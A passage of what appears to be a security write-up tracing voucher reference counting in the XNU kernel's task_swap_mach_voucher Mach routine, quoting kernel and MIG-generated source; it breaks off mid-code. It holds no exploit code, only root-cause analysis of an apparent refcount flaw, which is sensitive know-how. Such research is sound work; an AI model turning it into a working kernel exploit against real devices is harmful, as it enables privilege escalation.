    <span class="mi">6022</span><span class="o">:</span> 	<span class="n">ipc_voucher_t</span>		<span class="o">*</span><span class="n">in_out_old_voucher</span><span class="p">)</span>
    <span class="mi">6023</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">6024</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">TASK_NULL</span> <span class="o">==</span> <span class="n">task</span><span class="p">)</span>
    <span class="mi">6025</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_INVALID_TASK</span><span class="p">;</span>
    <span class="mi">6026</span><span class="o">:</span> 
    <span class="mi">6027</span><span class="o">:</span> 	<span class="o">*</span><span class="n">in_out_old_voucher</span> <span class="o">=</span> <span class="n">new_voucher</span><span class="p">;</span>
    <span class="mi">6028</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">6029</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">6030</span><span class="o">:</span> </code></pre></figure>

<p>The function <strong>task_swap_mach_voucher</strong> is a placeholder as per the comments. A quick search for it would also find the routine under <strong>xnu-4903.221.2/osfmk/mach/task.defs</strong></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task</span><span class="p">.</span><span class="n">defs</span>
    <span class="mi">455</span><span class="o">:</span> <span class="n">routine</span> <span class="n">task_swap_mach_voucher</span><span class="p">(</span>
    <span class="mi">456</span><span class="o">:</span> 		<span class="n">task</span>		<span class="o">:</span> <span class="n">task_t</span><span class="p">;</span>
    <span class="mi">457</span><span class="o">:</span> 		<span class="n">new_voucher</span>	<span class="o">:</span> <span class="n">ipc_voucher_t</span><span class="p">;</span>
    <span class="mi">458</span><span class="o">:</span> 	<span class="n">inout</span>	<span class="n">old_voucher</span>	<span class="o">:</span> <span class="n">ipc_voucher_t</span><span class="p">);</span></code></pre></figure>

<p>This proves that it is actually a Mach API, since MIG def files are generating code for Mach Interfaces. Lets search for <strong>task_swap_mach_voucher</strong>. Remember that we are doing this on a compiled version. Under the file <strong>/BUILD/obj/RELEASE_X86_64/osfmk/mach/task.h</strong> we can find the Mach message format for this function.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">2086</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">2087</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="mi">2088</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">2089</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="mi">2090</span><span class="o">:</span> 		<span class="n">mach_msg_header_t</span> <span class="n">Head</span><span class="p">;</span>
    <span class="mi">2091</span><span class="o">:</span> 		<span class="cm">/* start of the kernel processed data */</span>
    <span class="mi">2092</span><span class="o">:</span> 		<span class="n">mach_msg_body_t</span> <span class="n">msgh_body</span><span class="p">;</span>
    <span class="mi">2093</span><span class="o">:</span> 		<span class="n">mach_msg_port_descriptor_t</span> <span class="n">old_voucher</span><span class="p">;</span>
    <span class="mi">2094</span><span class="o">:</span> 		<span class="cm">/* end of the kernel processed data */</span>
    <span class="mi">2095</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">__Reply__task_swap_mach_voucher_t</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">2096</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">2097</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">()</span>
    <span class="mi">2098</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span></code></pre></figure>

<p>And under the file <strong>/BUILD/obj/RELEASE_X86_64/osfmk/RELEASE/mach/task_server.c</strong> we can see checks being performed on the request.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">RELEASE_X86_64</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">RELEASE</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task_server</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">4714</span><span class="o">:</span> <span class="n">mig_internal</span> <span class="n">kern_return_t</span> <span class="n">__MIG_check__Request__task_swap_mach_voucher_t</span><span class="p">(</span><span class="n">__attribute__</span><span class="p">((</span><span class="n">__unused__</span><span class="p">))</span> <span class="n">__Request__task_swap_mach_voucher_t</span> <span class="o">*</span><span class="n">In0P</span><span class="p">)</span>
    <span class="mi">4715</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">4716</span><span class="o">:</span> 
    <span class="mi">4717</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Request__task_swap_mach_voucher_t</span> <span class="n">__Request</span><span class="p">;</span>
    <span class="mi">4718</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">__MigTypeCheck</span>
    <span class="mi">4719</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_bits</span> <span class="o">&amp;</span> <span class="n">MACH_MSGH_BITS_COMPLEX</span><span class="p">)</span> <span class="o">||</span>
    <span class="mi">4720</span><span class="o">:</span> 	    <span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">msgh_body</span><span class="p">.</span><span class="n">msgh_descriptor_count</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="o">||</span>
    <span class="mi">4721</span><span class="o">:</span> 	    <span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_size</span> <span class="o">!=</span> <span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)</span><span class="k">sizeof</span><span class="p">(</span><span class="n">__Request</span><span class="p">)))</span>
    <span class="mi">4722</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">MIG_BAD_ARGUMENTS</span><span class="p">;</span>
    <span class="mi">4723</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* __MigTypeCheck */</span>
    <span class="mi">4724</span><span class="o">:</span> 
    <span class="mi">4725</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">__MigTypeCheck</span>
    <span class="mi">4726</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">type</span> <span class="o">!=</span> <span class="n">MACH_MSG_PORT_DESCRIPTOR</span> <span class="o">||</span>
    <span class="mi">4727</span><span class="o">:</span> 	    <span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">disposition</span> <span class="o">!=</span> <span class="mi">17</span><span class="p">)</span>
    <span class="mi">4728</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">MIG_TYPE_ERROR</span><span class="p">;</span>
    <span class="mi">4729</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* __MigTypeCheck */</span>
    <span class="mi">4730</span><span class="o">:</span> 
    <span class="mi">4731</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">__MigTypeCheck</span>
    <span class="mi">4732</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">type</span> <span class="o">!=</span> <span class="n">MACH_MSG_PORT_DESCRIPTOR</span> <span class="o">||</span>
    <span class="mi">4733</span><span class="o">:</span> 	    <span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">disposition</span> <span class="o">!=</span> <span class="mi">17</span><span class="p">)</span>
    <span class="mi">4734</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">MIG_TYPE_ERROR</span><span class="p">;</span>
    <span class="mi">4735</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* __MigTypeCheck */</span>
    <span class="mi">4736</span><span class="o">:</span> 
    <span class="mi">4737</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">MACH_MSG_SUCCESS</span><span class="p">;</span>
    <span class="mi">4738</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<p>And the actual implementation can be found just below it.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">RELEASE_X86_64</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">RELEASE</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task_server</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">4744</span><span class="o">:</span> <span class="cm">/* Routine task_swap_mach_voucher */</span>
    <span class="mi">4745</span><span class="o">:</span> <span class="n">mig_internal</span> <span class="n">novalue</span> <span class="n">_Xtask_swap_mach_voucher</span>
    <span class="mi">4746</span><span class="o">:</span> 	<span class="p">(</span><span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">InHeadP</span><span class="p">,</span> <span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">OutHeadP</span><span class="p">)</span>
    <span class="mi">4747</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">4748</span><span class="o">:</span> 
    <span class="mi">4749</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">4750</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="mi">4751</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">4752</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="mi">4753</span><span class="o">:</span> 		<span class="n">mach_msg_header_t</span> <span class="n">Head</span><span class="p">;</span>
    <span class="mi">4754</span><span class="o">:</span> 		<span class="cm">/* start of the kernel processed data */</span>
    <span class="mi">4755</span><span class="o">:</span> 		<span class="n">mach_msg_body_t</span> <span class="n">msgh_body</span><span class="p">;</span>
    <span class="mi">4756</span><span class="o">:</span> 		<span class="n">mach_msg_port_descriptor_t</span> <span class="n">new_voucher</span><span class="p">;</span>
    <span class="mi">4757</span><span class="o">:</span> 		<span class="n">mach_msg_port_descriptor_t</span> <span class="n">old_voucher</span><span class="p">;</span>
    <span class="mi">4758</span><span class="o">:</span> 		<span class="cm">/* end of the kernel processed data */</span>
    <span class="mi">4759</span><span class="o">:</span> 		<span class="n">mach_msg_trailer_t</span> <span class="n">trailer</span><span class="p">;</span>
    <span class="mi">4760</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">Request</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">4761</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">4762</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">()</span>
    <span class="mi">4763</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">4764</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Request__task_swap_mach_voucher_t</span> <span class="n">__Request</span><span class="p">;</span>
    <span class="mi">4765</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Reply__task_swap_mach_voucher_t</span> <span class="n">Reply</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">4766</span><span class="o">:</span> 
    <span class="mi">4767</span><span class="o">:</span> 	<span class="cm">/*
    4768: 	 * typedef struct {
    4769: 	 * 	mach_msg_header_t Head;
    4770: 	 * 	NDR_record_t NDR;
    4771: 	 * 	kern_return_t RetCode;
    4772: 	 * } mig_reply_error_t;
    4773: 	 */</span>
    <span class="mi">4774</span><span class="o">:</span> </code></pre></figure>

<p>Here is the stripped out implementation, with the interesting functions marked in bold.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/* Routine task_swap_mach_voucher */</span>
<span class="n">mig_internal</span> <span class="n">novalue</span> <span class="nf">_Xtask_swap_mach_voucher</span>
	<span class="p">(</span><span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">InHeadP</span><span class="p">,</span> <span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">OutHeadP</span><span class="p">)</span>
<span class="p">{</span>

<span class="o">-----------------------------</span>
<span class="o">-----------------------------</span>
<span class="cp">#endif
</span>	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">pad2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">MACH_MSG_PORT_DESCRIPTOR</span><span class="p">;</span>
<span class="cp">#if defined(KERNEL)
</span>	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">pad_end</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="cp">#endif
#endif	</span><span class="cm">/* UseStaticTemplates */</span><span class="cp">
</span>
	<span class="n">task</span> <span class="o">=</span> <span class="n">convert_port_to_task</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_request_port</span><span class="p">);</span>

	<span class="n">new_voucher</span> <span class="o">=</span> <span class="o">**</span><span class="n">convert_port_to_voucher</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">)</span><span class="o">**</span><span class="p">;</span>

	<span class="n">old_voucher</span> <span class="o">=</span> <span class="o">**</span><span class="n">convert_port_to_voucher</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">)</span><span class="o">**</span><span class="p">;</span>

	<span class="n">RetCode</span> <span class="o">=</span> <span class="o">**</span><span class="n">task_swap_mach_voucher</span><span class="p">(</span><span class="n">task</span><span class="p">,</span> <span class="n">new_voucher</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">old_voucher</span><span class="p">)</span><span class="o">**</span><span class="p">;</span>
	<span class="o">**</span><span class="n">ipc_voucher_release</span><span class="p">(</span><span class="n">new_voucher</span><span class="p">)</span><span class="o">**</span><span class="p">;</span>
	<span class="n">task_deallocate</span><span class="p">(</span><span class="n">task</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">RetCode</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">MIG_RETURN_ERROR</span><span class="p">(</span><span class="n">OutP</span><span class="p">,</span> <span class="n">RetCode</span><span class="p">);</span>
	<span class="p">}</span>
<span class="cp">#if	__MigKernelSpecificCode
</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">))</span>
		<span class="n">ipc_port_release_send</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">))</span>
		<span class="n">ipc_port_release_send</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
<span class="cp">#endif </span><span class="cm">/* __MigKernelSpecificCode */</span><span class="cp">
</span>	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_port_t</span><span class="p">)</span><span class="o">**</span><span class="n">convert_voucher_to_port</span><span class="p">(</span><span class="n">old_voucher</span><span class="p">)</span><span class="o">**</span><span class="p">;</span>

	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_bits</span> <span class="o">|=</span> <span class="n">MACH_MSGH_BITS_COMPLEX</span><span class="p">;</span>
	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">Reply</span><span class="p">));</span>
	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">msgh_body</span><span class="p">.</span><span class="n">msgh_descriptor_count</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="n">__AfterRcvRpc</span><span class="p">(</span><span class="mi">3441</span><span class="p">,</span> <span class="s">"task_swap_mach_voucher"</span><span class="p">)</span>
<span class="p">}</span></code></pre></figure>

<p>The function <strong>convert_port_to_voucher</strong> increases the reference count by one by calling <strong>ipc_voucher_reference</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">386</span><span class="o">:</span> <span class="cm">/*
    387:  *	Routine:	convert_port_to_voucher
    388:  *	Purpose:
    389:  *		Convert from a port to a voucher.
    390:  *		Doesn't consume the port [send-right] ref;
    391:  *		produces a voucher ref,	which may be null.
    392:  *	Conditions:
    393:  *		Caller has a send-right reference to port.
    394:  *		Port may or may not be locked.
    395:  */</span>
    <span class="mi">396</span><span class="o">:</span> <span class="n">ipc_voucher_t</span>
    <span class="mi">397</span><span class="o">:</span> <span class="n">convert_port_to_voucher</span><span class="p">(</span>
    <span class="mi">398</span><span class="o">:</span> 	<span class="n">ipc_port_t</span>	<span class="n">port</span><span class="p">)</span>
    <span class="mi">399</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">400</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">401</span><span class="o">:</span> 		<span class="n">ipc_voucher_t</span> <span class="n">voucher</span> <span class="o">=</span> <span class="p">(</span><span class="n">ipc_voucher_t</span><span class="p">)</span> <span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_kobject</span><span class="p">;</span>
    <span class="mi">402</span><span class="o">:</span> 
    <span class="mi">403</span><span class="o">:</span> 		<span class="cm">/*
    404: 		 * No need to lock because we have a reference on the
    405: 		 * port, and if it is a true voucher port, that reference
    406: 		 * keeps the voucher bound to the port (and active).
    407: 		 */</span>
    <span class="mi">408</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="n">ip_kotype</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">!=</span> <span class="n">IKOT_VOUCHER</span><span class="p">)</span>
    <span class="mi">409</span><span class="o">:</span> 			<span class="k">return</span> <span class="n">IV_NULL</span><span class="p">;</span>
    <span class="mi">410</span><span class="o">:</span> 
    <span class="mi">411</span><span class="o">:</span> 		<span class="n">assert</span><span class="p">(</span><span class="n">ip_active</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
    <span class="mi">412</span><span class="o">:</span> 
    <span class="mi">413</span><span class="o">:</span> 		<span class="n">ipc_voucher_reference</span><span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">414</span><span class="o">:</span> 		<span class="k">return</span> <span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">415</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">416</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">IV_NULL</span><span class="p">;</span>
    <span class="mi">417</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">418</span><span class="o">:</span> </code></pre></figure>

<p>The function <strong>convert_voucher_to_port</strong> will decrease the reference count by calling <strong>ipc_voucher_release</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">492</span><span class="o">:</span> <span class="cm">/*
    493:  * Convert a voucher to a port.
    494:  */</span>
    <span class="mi">495</span><span class="o">:</span> <span class="n">ipc_port_t</span>
    <span class="mi">496</span><span class="o">:</span> <span class="n">convert_voucher_to_port</span><span class="p">(</span><span class="n">ipc_voucher_t</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">497</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">498</span><span class="o">:</span> 	<span class="n">ipc_port_t</span>	<span class="n">port</span><span class="p">,</span> <span class="n">send</span><span class="p">;</span>
    <span class="mi">499</span><span class="o">:</span> 
    <span class="mi">500</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">IV_NULL</span> <span class="o">==</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">501</span><span class="o">:</span> 		<span class="k">return</span> <span class="p">(</span><span class="n">IP_NULL</span><span class="p">);</span>
    <span class="mi">502</span><span class="o">:</span> 
    <span class="mi">503</span><span class="o">:</span> 	<span class="n">assert</span><span class="p">(</span><span class="n">os_ref_get_count</span><span class="p">(</span><span class="o">&amp;</span><span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_refs</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
    <span class="mi">504</span><span class="o">:</span> 
    <span class="mi">505</span><span class="o">:</span> 	<span class="cm">/* create a port if needed */</span>
    <span class="mi">506</span><span class="o">:</span> 	<span class="n">port</span> <span class="o">=</span> <span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_port</span><span class="p">;</span>
    <span class="mi">507</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">508</span><span class="o">:</span> 		<span class="n">port</span> <span class="o">=</span> <span class="n">ipc_port_alloc_kernel</span><span class="p">();</span>
    <span class="mi">509</span><span class="o">:</span> 		<span class="n">assert</span><span class="p">(</span><span class="n">IP_VALID</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
    <span class="mi">510</span><span class="o">:</span> 		<span class="n">ipc_kobject_set_atomically</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="p">(</span><span class="n">ipc_kobject_t</span><span class="p">)</span> <span class="n">voucher</span><span class="p">,</span> <span class="n">IKOT_VOUCHER</span><span class="p">);</span>
    <span class="mi">511</span><span class="o">:</span> 
    <span class="mi">512</span><span class="o">:</span> 		<span class="cm">/* If we lose the race, deallocate and pick up the other guy's port */</span>
    <span class="mi">513</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">OSCompareAndSwapPtr</span><span class="p">(</span><span class="n">IP_NULL</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_port</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">514</span><span class="o">:</span> 			<span class="n">ipc_port_dealloc_kernel</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">515</span><span class="o">:</span> 			<span class="n">port</span> <span class="o">=</span> <span class="n">voucher</span><span class="o">-&gt;</span><span class="n">iv_port</span><span class="p">;</span>
    <span class="mi">516</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">(</span><span class="n">ip_kotype</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">==</span> <span class="n">IKOT_VOUCHER</span><span class="p">);</span>
    <span class="mi">517</span><span class="o">:</span> 			<span class="n">assert</span><span class="p">(</span><span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_kobject</span> <span class="o">==</span> <span class="p">(</span><span class="n">ipc_kobject_t</span><span class="p">)</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">518</span><span class="o">:</span> 		<span class="p">}</span>
    <span class="mi">519</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">520</span><span class="o">:</span> 	
    <span class="mi">521</span><span class="o">:</span> 	<span class="n">ip_lock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">522</span><span class="o">:</span> 	<span class="n">assert</span><span class="p">(</span><span class="n">ip_active</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
    <span class="mi">523</span><span class="o">:</span> 	<span class="n">send</span> <span class="o">=</span> <span class="n">ipc_port_make_send_locked</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">524</span><span class="o">:</span> 
    <span class="mi">525</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">==</span> <span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_srights</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">526</span><span class="o">:</span> 		<span class="n">ipc_port_t</span> <span class="n">old_notify</span><span class="p">;</span>
    <span class="mi">527</span><span class="o">:</span> 
    <span class="mi">528</span><span class="o">:</span> 		<span class="cm">/* transfer our ref to the port, and arm the no-senders notification */</span>
    <span class="mi">529</span><span class="o">:</span> 		<span class="n">assert</span><span class="p">(</span><span class="n">IP_NULL</span> <span class="o">==</span> <span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_nsrequest</span><span class="p">);</span>
    <span class="mi">530</span><span class="o">:</span> 		<span class="n">ipc_port_nsrequest</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">port</span><span class="o">-&gt;</span><span class="n">ip_mscount</span><span class="p">,</span> <span class="n">ipc_port_make_sonce_locked</span><span class="p">(</span><span class="n">port</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">old_notify</span><span class="p">);</span>
    <span class="mi">531</span><span class="o">:</span> 		<span class="cm">/* port unlocked */</span>
    <span class="mi">532</span><span class="o">:</span> 		<span class="n">assert</span><span class="p">(</span><span class="n">IP_NULL</span> <span class="o">==</span> <span class="n">old_notify</span><span class="p">);</span>
    <span class="mi">533</span><span class="o">:</span> 	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="mi">534</span><span class="o">:</span> 		<span class="cm">/* piggyback on the existing port reference, so consume ours */</span>
    <span class="mi">535</span><span class="o">:</span> 		<span class="n">ip_unlock</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
    <span class="mi">536</span><span class="o">:</span> 		<span class="n">ipc_voucher_release</span><span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">537</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">538</span><span class="o">:</span> 	<span class="k">return</span> <span class="p">(</span><span class="n">send</span><span class="p">);</span>
    <span class="mi">539</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">540</span><span class="o">:</span> </code></pre></figure>

<p>And within the routine <strong>task_swap_mach_voucher</strong>, the reference count of new voucher is descreased by one by calling <strong>ipc_voucher_release</strong> (Line 4844).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">RELEASE_X86_64</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">RELEASE</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task_server</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">4836</span><span class="o">:</span> 
    <span class="mi">4837</span><span class="o">:</span> 	<span class="n">task</span> <span class="o">=</span> <span class="n">convert_port_to_task</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_request_port</span><span class="p">);</span>
    <span class="mi">4838</span><span class="o">:</span> 
